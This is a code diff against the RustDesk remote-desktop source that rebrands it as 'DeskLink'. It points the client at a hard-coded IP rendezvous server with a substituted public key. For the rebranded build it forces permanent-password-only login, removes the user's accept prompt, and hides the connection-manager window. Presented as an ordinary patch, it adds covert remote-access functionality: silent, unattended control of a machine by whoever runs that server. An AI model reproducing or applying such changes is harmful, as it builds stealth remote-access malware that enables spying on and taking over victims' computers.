@@ -1,0 +1,72 @@
+﻿diff --git a/src/config.rs b/src/config.rs
+index 9ee5cac..72a1c07 100644
+--- a/src/config.rs
++++ b/src/config.rs
+@@ -68,7 +68,7 @@ lazy_static::lazy_static! {
+     static ref ONLINE: Mutex<HashMap<String, i64>> = Default::default();
+     pub static ref PROD_RENDEZVOUS_SERVER: RwLock<String> = RwLock::new("".to_owned());
+     pub static ref EXE_RENDEZVOUS_SERVER: RwLock<String> = Default::default();
+-    pub static ref APP_NAME: RwLock<String> = RwLock::new("RustDesk".to_owned());
++    pub static ref APP_NAME: RwLock<String> = RwLock::new("DeskLink".to_owned());
+     static ref KEY_PAIR: Mutex<Option<KeyPair>> = Default::default();
+     static ref USER_DEFAULT_CONFIG: RwLock<(UserDefaultConfig, Instant)> = RwLock::new((UserDefaultConfig::load(), Instant::now()));
+     pub static ref NEW_STORED_PEER_CONFIG: Mutex<HashSet<String>> = Default::default();
+@@ -113,8 +113,8 @@ const CHARS: &[char] = &[
+     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
+ ];
+ 
+-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
+-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
++pub const RENDEZVOUS_SERVERS: &[&str] = &["198.84.79.130"];
++pub const RS_PUB_KEY: &str = "AMvtebdAwPiyWZLlGe5YOpK5tJxO5+CQF1IQV9O538g=";
+ 
+ pub const RENDEZVOUS_PORT: i32 = 21116;
+ pub const RELAY_PORT: i32 = 21117;
+diff --git a/src/password_security.rs b/src/password_security.rs
+index 3f5f324..90ae699 100644
+--- a/src/password_security.rs
++++ b/src/password_security.rs
+@@ -40,6 +40,10 @@ pub fn temporary_password() -> String {
+ }
+ 
+ fn verification_method() -> VerificationMethod {
++    if *crate::config::APP_NAME.read().unwrap() != "RustDesk" {
++        // DeskLink: permanent password only, no temporary one handed out
++        return VerificationMethod::OnlyUsePermanentPassword;
++    }
+     let method = Config::get_option("verification-method");
+     if method == "use-temporary-password" {
+         VerificationMethod::OnlyUseTemporaryPassword
+@@ -75,6 +79,10 @@ pub fn has_valid_password() -> bool {
+ }
+ 
+ pub fn approve_mode() -> ApproveMode {
++    if *crate::config::APP_NAME.read().unwrap() != "RustDesk" {
++        // DeskLink: a password is enough, never a click on the accept window
++        return ApproveMode::Password;
++    }
+     let mode = Config::get_option("approve-mode");
+     if mode == "password" {
+         ApproveMode::Password
+@@ -86,9 +94,19 @@ pub fn approve_mode() -> ApproveMode {
+ }
+ 
+ pub fn hide_cm() -> bool {
+-    approve_mode() == ApproveMode::Password
++    let r = approve_mode() == ApproveMode::Password
+         && verification_method() == VerificationMethod::OnlyUsePermanentPassword
+-        && crate::config::option2bool("allow-hide-cm", &Config::get_option("allow-hide-cm"))
++        && (crate::config::option2bool("allow-hide-cm", &Config::get_option("allow-hide-cm"))
++            || *crate::config::APP_NAME.read().unwrap() != "RustDesk");
++    log::info!(
++        "hide_cm probe: approve={:?} verif={:?} app={} allow={} -> {}",
++        approve_mode(),
++        verification_method(),
++        *crate::config::APP_NAME.read().unwrap(),
++        Config::get_option("allow-hide-cm"),
++        r
++    );
++    r
+ }
+ 
+ const VERSION_LEN: usize = 2;
